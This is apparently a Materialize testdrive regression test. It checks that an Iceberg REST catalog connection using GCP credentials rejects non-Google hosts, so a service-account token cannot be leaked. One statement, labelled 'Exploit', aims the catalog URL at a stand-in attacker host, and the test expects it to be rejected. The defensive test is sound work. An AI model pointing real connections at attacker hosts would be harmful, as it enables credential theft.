# Copyright Materialize, Inc. and contributors. All rights reserved.
#
# Use of this software is governed by the Business Source License
# included in the LICENSE file at the root of this repository.
#
# As of the Change Date specified in that file, in accordance with
# the Business Source License, use of this software will be governed
# by the Apache License, Version 2.0.

# Regression test for SS-69: an Iceberg REST catalog connection that
# authenticates with a GCP connection must only send its reusable, broadly-
# scoped bearer token to a Google-operated host. Without a plan-time host check,
# a principal with only USAGE on the GCP connection can aim the catalog URL at a
# host they control and exfiltrate the service-account token.

# Disable default validation so the accepted case below doesn't connect; the
# host check is enforced at plan time, independent of validation.
$ postgres-execute connection=postgres://mz_system:materialize@${testdrive.materialize-internal-sql-addr}
ALTER SYSTEM SET enable_default_connection_validation = false

> CREATE SECRET gcpsa AS 'dummy'

> CREATE CONNECTION gcpconn TO GCP (SERVICE ACCOUNT KEY = SECRET gcpsa)

# Exploit: a non-Google catalog host must be rejected before any token is sent.
! CREATE CONNECTION evil TO ICEBERG CATALOG (
    CATALOG TYPE = 'rest',
    URL = 'https://attacker.example.com/iceberg/v1/restcatalog',
    GCP CONNECTION = gcpconn,
    WAREHOUSE = 'gs://anything'
  )
contains:GCP connection can only be used with 'https://biglake.googleapis.com/iceberg/v1/restcatalog'

# Positive control: a real BigLake host is accepted, so the allowlist doesn't
# break the feature.
> CREATE CONNECTION biglake TO ICEBERG CATALOG (
    CATALOG TYPE = 'rest',
    URL = 'https://biglake.googleapis.com/iceberg/v1/restcatalog',
    GCP CONNECTION = gcpconn,
    WAREHOUSE = 'gs://anything'
  )
